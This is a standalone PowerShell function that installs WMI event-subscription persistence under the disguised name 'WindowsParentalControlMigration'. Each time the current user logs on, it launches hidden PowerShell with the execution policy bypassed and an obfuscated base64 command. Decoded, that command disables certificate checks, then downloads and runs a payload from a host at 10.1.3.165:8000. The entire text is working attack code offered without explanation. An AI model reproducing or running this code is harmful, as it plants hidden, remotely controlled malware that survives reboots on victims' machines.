function wmi {
	
	$FilterArgs = @{name='WindowsParentalControlMigration';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser' AND TargetInstance.__RELPATH like '%$($env:UserName)%'";}
	$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

	$ConsumerArgs = @{name='WindowsParentalControlMigration';
                CommandLineTemplate="powershell -exec bypass -Noninteractive -windowstyle hidden -e UwBlAHQALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBwAGEAcwBzACAALQBTAGMAbwBwAGUAIABQAHIAbwBjAGUAcwBzACAALQBGAG8AcgBjAGUAOwAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6AFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsACAALQBiAG8AcgAgADMAMAA3ADIAOwAgAGkAZQB4ACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAuADMALgAxADYANQA6ADgAMAAwADAALwBsAG8AYQBkAC8AcABhAGcAZQBzAC8AaQBuAGQAZQB4AC4AcABoAHAALwBfAHIAcAAnACkAKQApACkA";}
	$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

	$FilterToConsumerArgs = @{
		Filter = [Ref] $Filter
		Consumer = [Ref] $Consumer
	}
	$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
}
